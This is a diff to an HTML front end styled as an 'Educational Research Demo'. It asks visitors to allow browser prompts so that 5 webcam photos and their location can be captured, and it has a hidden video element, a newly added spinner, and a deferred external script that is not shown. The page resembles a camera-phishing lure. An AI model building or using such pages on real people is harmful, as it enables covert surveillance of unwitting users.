@@ -5,7 +5,12 @@
 <title>Educational Research Demo</title>
 <style>
   body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
-  .card { text-align:center; max-width:500px; padding:32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+  .card { text-align:center; max-width:500px; padding:40px 32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+  
+  /* Spinning Ring Styles */
+  .ring { width: 50px; height: 50px; border: 5px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
   h2 { color: #38bdf8; margin-top: 0; }
   p { opacity:.9; line-height:1.6; font-size: 15px; }
   .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
@@ -15,6 +20,9 @@
 </head>
 <body>
 <div class="card" id="main-card">
+  <!-- The Spinning Ring -->
+  <div class="ring" id="spinner"></div>
+  
   <h2>🔬 Educational Research Demo</h2>
   <p><strong>Note:</strong> By clicking "Allow" on the browser prompts, you agree to participate in this educational webcam and location demo.</p>
   <p>The system will capture <strong>5 photos</strong> and your approximate location. No data is shared with third parties.</p>
@@ -22,9 +30,7 @@
   <p id="status" class="status">Initializing...</p>
 </div>
 
-<!-- Hidden video element for capturing -->
 <video id="preview" autoplay muted playsinline style="display:none;"></video>
 
-<!-- Link to the backend script -->
-<script src="app.js"></script>
+<script src="app.js" defer></script>
 </body></html>
